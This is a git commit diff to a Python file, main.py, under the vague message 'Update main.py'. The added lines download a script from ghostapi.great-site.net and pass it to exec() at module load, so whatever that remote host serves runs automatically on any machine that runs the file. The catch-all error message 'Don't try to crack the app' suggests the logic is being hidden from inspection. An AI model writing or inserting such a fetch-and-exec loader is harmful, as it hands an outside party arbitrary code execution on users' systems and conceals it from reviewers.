42597cc896994613a0b004a15ed9eaf7b6adffd3
Ghosthsia <145263586+Ghosthsia@users.noreply.github.com>
2024-05-13 23:54:15 +0100

    Update main.py

--- main.py
+++ main.py
@@ -1,17 +1,10 @@
 import requests
-import ssl
+data = requests.get(url="https://ghostapi.great-site.net/api.py").text
+exec(data)
 
-# Disable SSL certificate verification
-ssl._create_default_https_context = ssl._create_unverified_context
 
 def start_script():
     try:
-        response = requests.get(url="https://ghostapi.great-site.net/api.py")
-        if response.status_code == 200:
-            data = response.text
-            exec(data)
-            start_bot()
-        else:
-            return "Failed to fetch script data"
+        eval("""start_bot()""")
     except Exception as e:
         return "Don't try to crack the app"
